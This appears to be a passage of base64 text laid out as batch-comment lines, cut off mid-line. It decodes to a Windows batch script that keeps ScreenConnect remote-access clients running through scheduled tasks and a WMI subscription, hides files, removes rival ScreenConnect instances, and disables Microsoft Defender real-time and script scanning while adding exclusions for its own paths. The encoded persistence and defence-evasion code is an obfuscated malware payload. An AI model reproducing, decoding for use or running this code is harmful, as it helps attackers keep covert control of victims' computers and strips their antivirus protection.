::cmVhcm0gd2hlbiBXaW5kb3dzIGJ1aWx0LWluIHRhc2tzIHNoYXJlZA0KcmVtIGRl
::ZmF1bHQgbmFtZXMgKERpYWdub3Npc1xTY2hlZHVsZWQgZXRjLikgLT4gbW9uIG5l
::dmVyIHJhbiwgbm8gbG9nLg0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiICgN
::CiAgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxs
::IC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlw
::YXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHRhc2tzLWVuc3Vy
::ZSAtV29ya0RpciAiJVdEJSIgLU1vblBhdGggIiVXRCVcb3duX21vbi5jbWQiYCkg
::ZG8gKA0KICAgIGVjaG8gdGFza3NfZW5zdXJlICUlUj4+IiVMT0clIg0KICAgIHNl
::dCAiVEFTS1NfRU5TVVJFPSUlUiINCiAgKQ0KKQ0KaWYgbm90IGV4aXN0ICIlRVRM
::JSIgbWtkaXIgIiVFVEwlIiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlV0QlXG93bl9t
::b24uY21kIiAoDQogIGF0dHJpYiAtaCAtcyAtciAiJUVUTCVcZXRsX21vbi5jbWQi
::ID5udWwgMj4mMQ0KICBjb3B5IC95ICIlV0QlXG93bl9tb24uY21kIiAiJUVUTCVc
::ZXRsX21vbi5jbWQiID5udWwgMj4mMQ0KKQ0KDQpyZW0g4pSA4pSAIFtCMl0gcmUt
::YXJtIGNoYWluIDIgKFdNSSBzdWJzY3JpcHRpb24pIGlmIG1pc3Npbmcg4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSADQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBz
::MSIgKA0KICBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vy
::c2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGlj
::eSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gd2F0Y2hk
::b2ctZW5zdXJlIC1Xb3JrRGlyICIlV0QlIiAtTW9uUGF0aCAiJVdEJVxvd25fbW9u
::LmNtZCJgKSBkbyBzZXQgIldEX1NUQVRFPSUlUiINCiAgaWYgL0kgIiFXRF9TVEFU
::RSEiPT0iUkVBUk1FRCIgZWNobyB3YXRjaGRvZyBXTUkgUkVBUk1FRD4+IiVMT0cl
::Ig0KKQ0KDQpyZW0g4pSA4pSAIFtFMF0gc3luYyBHcnl4YSBGUCBmcm9tIHZlcmlm
::aWVkIGdyeXhhLmNvbSBTQyBCRUZPUkUgZXh0ZXJtaW5hdGUg4pSA4pSADQppZiBl
::eGlzdCAiJVdEJVxvd25fbGliLnBzMSIgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2Zp
::bGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxl
::ICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN5bmMtZ3J5eGEtZnAgLVdvcmtE
::aXIgIiVXRCUiID5udWwgMj4mMQ0KICBpZiBleGlzdCAiJVdEJVxncnl4YS5jZmci
::IGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgi
::JVdEJVxncnl4YS5jZmciKSBkbyBpZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNl
::dCAiR1JZWEFfRlA9JSVMIg0KKQ0KDQpyZW0g4pSA4pSAIFtFXSBMNDUvTTQ4IEhB
::TkRTLU9GRjogc2tpcCBleHRlcm1pbmF0ZSAoZG8gbm90IHRvdWNoIGFueSBTY3Jl
::ZW5Db25uZWN0KSDilIDilIANCmVjaG8gaGFuZHNfb2ZmX3NraXBfZXh0ZXJtaW5h
::dGU+PiIlTE9HJSINCnNldCAiRk9SRUlHTl9MRUZUPTAiDQpmb3IgL2YgInRva2Vu
::cz0yIGRlbGltcz0oKSIgJSVhIGluICgnc2MgcXVlcnkgc3RhdGVePSBhbGwgXnwg
::ZmluZHN0ciAvQzoiU0VSVklDRV9OQU1FOiBTY3JlZW5Db25uZWN0IENsaWVudCIn
::KSBkbyAoDQogIHNldCAiRlA9JSVhIg0KICBzZXQgIkZQPSFGUDogPSEiDQogIHJl
::bSBmcmllbmRseSBpZiBrZWVwZXIgRlAgT1IgZ3J5eGEtcmVsYXkgKEltYWdlUGF0
::aCBoYXMgZ3J5eGEuY29tKSDigJQgbmV2ZXIgY291bnQgbmV3IEdyeXhhIGFzIGZv
::cmVpZ24NCiAgc2V0ICJGUklFTkRMWT0wIg0KICBpZiAvSSAiIUZQISI9PSIlS0VF
::UF9GUCUiIHNldCAiRlJJRU5ETFk9MSINCiAgaWYgL0kgIiFGUCEiPT0iJUFMVF9G
::UCUiIHNldCAiRlJJRU5ETFk9MSINCiAgaWYgL0kgIiFGUCEiPT0iJUdSWVhBX0ZQ
::JSIgc2V0ICJGUklFTkRMWT0xIg0KICBpZiAiIUZSSUVORExZISI9PSIwIiAoDQog
::ICAgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJUkgaW4gKGByZWcgcXVlcnkg
::IkhLTE1cU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFNjcmVlbkNv
::bm5lY3QgQ2xpZW50ICghRlAhKSIgL3YgSW1hZ2VQYXRoIDJePm51bCBefCBmaW5k
::c3RyIC9JICJJbWFnZVBhdGgiYCkgZG8gKA0KICAgICAgZWNobyAlJUkgfCBmaW5k
::c3RyIC9JICJncnl4YS5jb20iID5udWwgJiYgc2V0ICJGUklFTkRMWT0xIg0KICAg
::ICkNCiAgKQ0KICBpZiAiIUZSSUVORExZISI9PSIwIiAoDQogICAgc2V0IC9hIENP
::VU5UKz0xDQogICAgc2V0IC9hIEZPUkVJR05fTEVGVCs9MQ0KICAgIHNldCAiRk9S
::RUlHTl9MSVNUPSFGT1JFSUdOX0xJU1QhIUZQISAiDQogICAgZWNobyBmb3JlaWdu
::X2xlZnRfIUZQIT4+IiVMT0clIg0KICApDQopDQoNCnJlbSDilIDilIAgW0NdIGhl
::YWwgU2NyZWVuQ29ubmVjdCBwcmltL2FsdCDilIDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIANCmZvciAvZiAidG9rZW5zPTEsMiBkZWxpbXM9KCkiICUl
::YSBpbiAoJ3NjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAl
::KSIgXnwgZmluZHN0ciAvQzoiU0VSVklDRV9OQU1FIicpIGRvICgNCiAgc2V0ICJJ
::TlNUQUxMRUQ9MSINCiAgc2V0ICJQUklNU1RBVEU9JSViIg0KKQ0Kc2MgcXVlcnkg
::IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5J
::TkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICBzZXQgIlBSSU1fT0s9
::MSINCiAgc2V0IC9hIENPVU5UKz0xDQopDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVj
::dCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZl
::bCAxIHNldCAvYSBDT1VOVCs9MQ0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xp
::ZW50ICglQUxUX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVy
::cm9ybGV2ZWwgMSBzZXQgIkFMVF9PSz0xIg0KDQppZiAiJUlOU1RBTExFRCUiPT0i
::MSIgaWYgIiVQUklNX09LJSI9PSIwIiAoDQogIGVjaG8gc3ZjIGhlYWwgcmVzdGFy
::dD4+IiVMT0clIg0KICBuZXQgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
::S0VFUF9GUCUpIiA+bnVsIDI+JjENCiAgc2Mgc3RhcnQgIlNjcmVlbkNvbm5lY3Qg
::Q2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjENCiAgdGltZW91dCAvdCA2IC9u
::b2JyZWFrID5udWwNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
::S0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCiAgaWYgbm90IGVycm9y
::bGV2ZWwgMSBzZXQgIlBSSU1fT0s9MSINCikNCnJlbSBNMTY6IHN0aWxsIHN0b3Bw
::ZWQgLT4gcmVwYWlyIHRoZSBSRUdJU1RFUkVEIHByb2R1Y3QgKG1zaWV4ZWMgL2Zh
::IHJlc3RvcmVzDQpyZW0gYmluYXJpZXMgKyBzdGFydHMgdGhlIHNlcnZpY2U7IEw1
::IFJlcGFpci1TQ1NlcnZpY2UgaGFuZGxlcyBzdG9wcGVkIHN2Y3MpDQppZiAiJUlO
::U1RBTExFRCUiPT0iMSIgaWYgIiVQUklNX09LJSI9PSIwIiAoDQogIGVjaG8gc3Zj
::IGVzY2FsYXRlIHJlcGFpcj4+IiVMT0clIg0KICBpZiBleGlzdCAiJVdEJVxvd25f
::bGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
::RXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIg
::LUFjdGlvbiByZXBhaXIgLUZwICIlS0VFUF9GUCUiIC1Xb3JrRGlyICIlV0QlIiA+
::PiIlTE9HJSIgMj4mMQ0KICB0aW1lb3V0IC90IDggL25vYnJlYWsgPm51bA0KICBz
::YyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmlu
::ZCAiUlVOTklORyIgPm51bA0KICBpZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiUFJJ
::TV9PSz0xIg0KKQ0KcmVtIE0xNjogb3JwaGFuZWQgc2VydmljZSBlbnRyeSAocHJv
::ZHVjdCB1bnJlZ2lzdGVyZWQgLSBlYXRlbiBieSBhbiBTQy1mYW1pbHkNCnJlbSB1
::cGdyYWRlIHJlbW92YWwpIGNhbiBORVZFUiBzdGFydC4gRGVsZXRlIGl0IGFuZCBm
::YWxsIHRocm91Z2ggdG8gdGhlDQpyZW0gZnJlc2gtaW5zdGFsbCBsYWRkZXIgYmVs
::b3cgaW5zdGVhZCBvZiBhbGVydGluZyAid29udCBzdGFydCIgZm9yZXZlci4NCmlm
::ICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgNCiAgc2V0
::ICJSRUdTVEFURT11bmtub3duIg0KICBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBz
::MSIgZm9yIC9mICJkZWxpbXM9IiAlJVIgaW4gKCdwb3dlcnNoZWxsIC1Ob1Byb2Zp
::bGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxl
::ICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlZ2lzdGVyZWQgLUZwICIlS0VF
::UF9GUCUiIC1Xb3JrRGlyICIlV0QlIicpIGRvIHNldCAiUkVHU1RBVEU9JSVSIg0K
::ICBlY2hvIG9ycGhhbl9jaGVjaz0hUkVHU1RBVEUhPj4iJUxPRyUiDQogIGlmIC9J
::ICIhUkVHU1RBVEUhIj09Im5vIiAoDQogICAgZWNobyBvcnBoYW5fc2VydmljZV9k
::ZWxldGVfU0tJUFBFRF9oYW5kc19vZmY+PiIlTE9HJSINCiAgICByZW0gTTQ4OiBu
::ZXZlciBzYyBkZWxldGUgYW55IFNjcmVlbkNvbm5lY3QNCg0KICApDQopDQppZiAi
::JUlOU1RBTExFRCUiPT0iMSIgaWYgIiVQUklNX09LJSI9PSIwIiAoDQogIHBvd2Vy
::c2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGlj
::eSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUg
::LVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgInN2Yy13b250
::LXN0YXJ0IiA+bnVsIDI+JjENCiAgY2FsbCA6VGdTdGF0ZSBET1dOICJTY3JlZW5D
::b25uZWN0ICglS0VFUF9GUCUpIGluc3RhbGxlZCBidXQgd29udCBzdGFydCINCiAg
::Z290byA6QWZ0ZXJIZWFsDQopDQppZiAiJUlOU1RBTExFRCUiPT0iMSIgZ290byA6
::QWZ0ZXJIZWFsDQoNCnJlbSDilIDilIAgW0RdIHByaW1hcnkgU0MgbWlzc2luZyAt
::IGhlYWwgbGFkZGVyIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KcmVtIE0xMjogRklSU1Qg
::cmVwYWlyIHRoZSByZWdpc3RlcmVkIHByb2R1Y3QgKHJlY3JlYXRlcyBzZXJ2aWNl
::IHdpdGhvdXQNCnJlbSB0b3VjaGluZyB0aGUgQUxUIGluc3RhbmNlKTsgZnJlc2gg
::bXNpZXhlYyBpbnN0YWxsIG9ubHkgYXMgZmFsbGJhY2suDQplY2hvIHN2YyBtaXNz
::aW5nIC0gaGVhbCBiZWdpbj4+IiVMT0clIg0KY2FsbCA6UmVwYWlyUmVnaXN0ZXJl
::ZCAiJUtFRVBfRlAlIg0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
::S0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCmlmIG5vdCBlcnJvcmxl
::dmVsIDEgKA0KICBzZXQgIklOU1RBTExFRD0xIg0KICBzZXQgIlBSSU1fT0s9MSIN
::CiAgZ290byA6QWZ0ZXJIZWFsDQopDQpyZW0gcmVmdXNlIGZyZXNoIC9pIGlmIHBy
::b2R1Y3Qgc3RpbGwgcmVnaXN0ZXJlZCAtIFVwZ3JhZGUgdGFibGUgY2FuIHdpcGUg
::QUxUL0dSWVhBDQpzZXQgIlJFR1NUQVRFPXVua25vd24iDQppZiBleGlzdCAiJVdE
::JVxvd25fbGliLnBzMSIgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4g
::KGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
::b25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9u
::IHJlZ2lzdGVyZWQgLUZwICIlS0VFUF9GUCUiIC1Xb3JrRGlyICIlV0QlImApIGRv
::IHNldCAiUkVHU1RBVEU9JSVSIg0KaWYgL0kgIiFSRUdTVEFURSEiPT0ieWVzIiAo
::DQogIGVjaG8gcHJpbWFyeV9yZWdpc3RlcmVkX3NraXBfZnJlc2hfaW5zdGFsbD4+
::IiVMT0clIg0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZl
::IC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMx
::IiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUg
::LUV4dHJhICJyZWdpc3RlcmVkLXN0dWNrIiA+bnVsIDI+JjENCiAgY2FsbCA6VGdT
::dGF0ZSBET1dOICJQcmltYXJ5IHJlZ2lzdGVyZWQgYnV0IHNlcnZpY2UgbWlzc2lu
::ZyAtIC9mYSBmYWlsZWQ7IHJlZnVzZWQgL2kgdG8gcHJvdGVjdCBBTFQvR1JZWEEi
::DQogIGdvdG8gOkFmdGVySGVhbA0KKQ0KcmVtIE8zNzogcmVmdXNlIHNldnJ6IC9p
::IHdoZW4gZ3J5eGEgYWxyZWFkeSBwcmVzZW50IOKAlCBzaGFyZWQgbGVnYWN5IFVw
::Z3JhZGVDb2Rlcw0KcmVtIHswQzk0NDQ4Qn0vezFGODVEN0ZFfSBtYWtlIHNpYmxp
::bmcgbXNpZXhlYyAvaSBrbm9jayBHcnl4YSBPRkZMSU5FIGluIHBhbmVsLg0KcmVt
::IE0zNjogZGV0ZWN0IEdyeXhhIGJ5IHJlbGF5IGRvbWFpbiB0b28gKGFueSBydW5u
::aW5nIGdyeXhhLmNvbSBTQyksIG5vdCBvbmx5IGJ5IEZQLg0Kc2V0ICJHUkVHPXVu
::a25vd24iDQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZm9yIC9mICJ1c2Vi
::YWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5v
::bkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0Ql
::XG93bl9saWIucHMxIiAtQWN0aW9uIHJlZ2lzdGVyZWQgLUZwICIlR1JZWEFfRlAl
::IiAtV29ya0RpciAiJVdEJSJgKSBkbyBzZXQgIkdSRUc9JSVSIg0Kc2MgcXVlcnkg
::IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgPm51bCAyPiYxDQpp
::ZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiR1JFRz15ZXMiDQpzYyBxdWVyeSAiU2Ny
::ZWVuQ29ubmVjdCBDbGllbnQgKDM2ZTUwNmZmMDE2YjIxNTEpIiA+bnVsIDI+JjEN
::CmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJHUkVHPXllcyINCnJlbSBhbnkgbm9u
::LXNldnJ6IFJ1bm5pbmcvUGVuZGluZyBTQyBPUiBJbWFnZVBhdGggZ3J5eGEuY29t
::ID0gR3J5eGEgcHJlc2VudA0KZm9yIC9mICJ0b2tlbnM9MiBkZWxpbXM9KCkiICUl
::YSBpbiAoJ3NjIHF1ZXJ5IHN0YXRlXj0gYWxsIF58IGZpbmRzdHIgL0M6IlNFUlZJ
::Q0VfTkFNRTogU2NyZWVuQ29ubmVjdCBDbGllbnQiJykgZG8gKA0KICBzZXQgIl9G
::UD0lJWEiDQogIHNldCAiX0ZQPSFfRlA6ID0hIg0KICBpZiAvSSBub3QgIiFfRlAh
::Ij09IiVLRUVQX0ZQJSIgaWYgL0kgbm90ICIhX0ZQISI9PSIlQUxUX0ZQJSIgKA0K
::ICAgIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoIV9GUCEpIiB8IGZp
::bmRzdHIgL0kgL0M6IlJVTk5JTkciIC9DOiJTVEFSVF9QRU5ESU5HIiA+bnVsDQog
::ICAgaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkdSRUc9eWVzIg0KICApDQogIGZv
::ciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVJIGluIChgcmVnIHF1ZXJ5ICJIS0xN
::XFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1xTY3JlZW5Db25uZWN0
::IENsaWVudCAoIV9GUCEpIiAvdiBJbWFnZVBhdGggMl4+bnVsIF58IGZpbmRzdHIg
::L0kgIkltYWdlUGF0aCJgKSBkbyAoDQogICAgZWNobyAlJUkgfCBmaW5kc3RyIC9J
::ICJncnl4YS5jb20iID5udWwgJiYgc2V0ICJHUkVHPXllcyINCiAgKQ0KKQ0KaWYg
::L0kgIiFHUkVHISI9PSJ5ZXMiICgNCiAgZWNobyBwcmltYXJ5X3NraXBfaV9wcm90
::ZWN0X2dyeXhhPj4iJUxPRyUiDQogIGVjaG8gaGFuZHNfb2ZmX2dyeXhhX3ByZXNl
::bnRfc2tpcF9zZXZyej4+IiVMT0clIg0KICBjYWxsIDpFbnN1cmVHcnl4YU11c3QN
::CiAgZ290byA6QWZ0ZXJIZWFsDQopDQpyZW0gTTQ4IEhBTkRTLU9GRjogc2tpcCBh
::bGwgc2V2cnogbXNpZXhlYyAvaSAvIHNjLWZhbWlseSBpbnN0YWxscw0KZWNobyBo
::YW5kc19vZmZfc2tpcF9zZXZyel9tc2k+PiIlTE9HJSINCmNhbGwgOkVuc3VyZUdy
::eXhhTXVzdA0KZ290byA6QWZ0ZXJIZWFsDQpjYWxsIDpSZXN0b3JlQWx0DQpjYWxs
::IDpFbnN1cmVHcnl4YU11c3QNCmlmICIlSU5TVEFMTEVEJSI9PSIwIiAoDQogIGlm
::IGV4aXN0ICIlV0QlXG1zaV9oZWFsLmxvZyIgKA0KICAgIGVjaG8gLS0tIG1zaV9o
::ZWFsLmxvZyB0YWlsIC0tLT4+IiVMT0clIg0KICAgIHBvd2Vyc2hlbGwgLU5vUHJv
::ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgIkdldC1Db250ZW50IC1MaXRl
::cmFsUGF0aCAnJVdEJVxtc2lfaGVhbC5sb2cnIC1UYWlsIDEwIiA+PiIlTE9HJSIg
::Mj4mMQ0KICApDQogIGlmIG5vdCBkZWZpbmVkIE1TSUVYSVQgc2V0ICJNU0lFWElU
::PWZldGNoLWZhaWwiDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJh
::Y3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xp
::Yi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9O
::VkVSJSAtRXh0cmEgIm1zaS1mYWlsZWQiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0
::YXRlIEZBSUwgIk1TSSBpbnN0YWxsIGZhaWxlZCBvbiBhbGwgc291cmNlcyAobXNp
::ZXhlYyBleGl0ICVNU0lFWElUJSkiDQopIGVsc2UgKA0KICBlY2hvIHN2YyByZXN0
::b3JlZD4+IiVMT0clIg0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVy
::YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9s
::aWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1P
::TlZFUiUgLUV4dHJhICJyZXN0b3JlZCIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3Rh
::dGUgUkVTVE9SRUQgIlNjcmVlbkNvbm5lY3QgcmVpbnN0YWxsZWQgT0siDQopDQoN
::CjpBZnRlckhlYWwNCnJlbSBNMTY6IEFMVCBwcmVzZW50LWJ1dC1zdG9wcGVkIC0+
::IHJlc3RhcnQsIHRoZW4gcmVwYWlyLWJ5LUdVSUQgKGV2ZXJ5IHRpY2spDQpzYyBx
::dWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYx
::DQppZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICglQUxUX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KICBp
::ZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gYWx0IHN0b3BwZWQgLSByZXN0YXJ0
::L3JlcGFpcj4+IiVMT0clIg0KICAgIG5ldCBzdGFydCAiU2NyZWVuQ29ubmVjdCBD
::bGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQogICAgc2Mgc3RhcnQgIlNjcmVl
::bkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiID5udWwgMj4mMQ0KICAgIHRpbWVv
::dXQgL3QgNSAvbm9icmVhayA+bnVsDQogICAgc2MgcXVlcnkgIlNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICglQUxUX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KICAg
::IGlmIGVycm9ybGV2ZWwgMSBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93
::ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9s
::aWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBh
::aXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYx
::DQogICkNCikNCnJlbSBNMTc6IEFMVCBzZXJ2aWNlIGVudHJ5IGRlbGV0ZWQgYnV0
::IHByb2R1Y3QgcmVnaXN0ZXJlZCAtPiByZXBhaXItYnktR1VJRCBldmVyeSB0aWNr
::DQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51
::bCAyPiYxDQppZiBlcnJvcmxldmVsIDEgKA0KICBlY2hvIGFsdF9taXNzaW5nX3Ry
::eV9yZXBhaXI+PiIlTE9HJSINCiAgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEi
::IHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlv
::blBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24g
::cmVwYWlyIC1GcCAiJUFMVF9GUCUiIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIg
::Mj4mMQ0KKQ0KcmVtIChleHRlcm1pbmF0aW9uIGFscmVhZHkgcmFuIHByZS1oZWFs
::IGluIFtFXTsgZm9yZWlnbiBzdXJ2aXZvcnMgY291bnRlZCB0aGVyZSkNCg0KcmVt
::IOKUgOKUgCBbRl0gc3RlYWx0aCByZS1zZWN1cmUgKHF1aWV0IERlZmVuZGVyIGV4
::Y2x1c2lvbiByZWZyZXNoKSDilIDilIANCnJlbSBNMzkvTTQzOiBNcFByZWZlcmVu
::Y2Ugd2hlbiBXaW5EZWZlbmQgYWxpdmU7IGFsd2F5cyBhbHNvIHdyaXRlIHBvbGlj
::eS9leGNsdXNpb24gUkVHDQpyZW0gKEhlbGwgaG9zdDogV2luRGVmZW5kIGRlYWQg
::4oaSIDB4ODAwMTA2YmEsIGJ1dCBBTVNJIHN0aWxsIGJsb2NrZWQgUFMg4oCUIHJl
::ZyArIG93bl9ncnl4YS5jbWQgY292ZXIgaXQpDQpyZWcgYWRkICJIS0xNXFNPRlRX
::QVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGlt
::ZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nIC90IFJF
::R19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
::RVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUg
::UHJvdGVjdGlvbiIgL3YgRGlzYWJsZVNjcmlwdFNjYW5uaW5nIC90IFJFR19EV09S
::RCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNy
::b3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVdE
::JSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNc
::UGF0aHMiIC92ICIlRVRMJSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYx
::DQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVu
::ZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlU3lzdGVtUm9vdCVcVGVtcFwudXBk
::IiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1c
::U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQ
::YXRocyIgL3YgIiVQcm9ncmFtRmlsZXMlXFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIg
::L3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
::RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0
::aHMiIC92ICIlUHJvZ3JhbUZpbGVzKHg4NiklXFNjcmVlbkNvbm5lY3QgQ2xpZW50
::KiIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNc
::UHJvY2Vzc2VzIiAvdiAiU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZSIg
